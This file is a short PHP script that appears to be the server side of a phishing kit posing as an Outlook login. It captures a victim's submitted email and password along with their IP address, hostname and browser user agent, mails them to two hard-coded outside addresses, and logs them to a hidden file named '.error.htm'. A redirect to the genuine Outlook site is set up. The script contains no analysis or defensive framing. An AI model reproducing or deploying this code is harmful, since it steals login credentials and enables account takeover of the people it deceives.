<?php
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/json; charset=utf-8');
?>
<?php
  $Receive_email="uplift22@yahoo.com,godgr82022@gmail.com";
$redirect="https://outlook.live.com/";
   $email = trim($_POST['ai']);
   $password = trim($_POST['pr']);

   
   if($email != null && $password != null){
   	
   	
   $ip = getenv("REMOTE_ADDR");
   	$hostname = gethostbyaddr($ip);
   	$useragent = $_SERVER['HTTP_USER_AGENT'];
   	$message .= "------------------------\n";
   	
   	$message .= "usr            : ".$email."\n";
   	$message .= "Ps             : ".$password."\n";
   	$message .= "----------------------------------\n";
   	$message .= $ip."\n";
   	$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
   	$message .= $useragent."\n";
   	$message .= "-----------------------\n";
   	$send = $Receive_email;
   	$subject = "Login : $ip";
       	mail($send, $subject, $message); 
       	
       	    	$data = "\n".$message;
	$fp = fopen('.error.htm', 'a');
	fwrite($fp, $data);
	fclose($fp);

   }
   
   ?>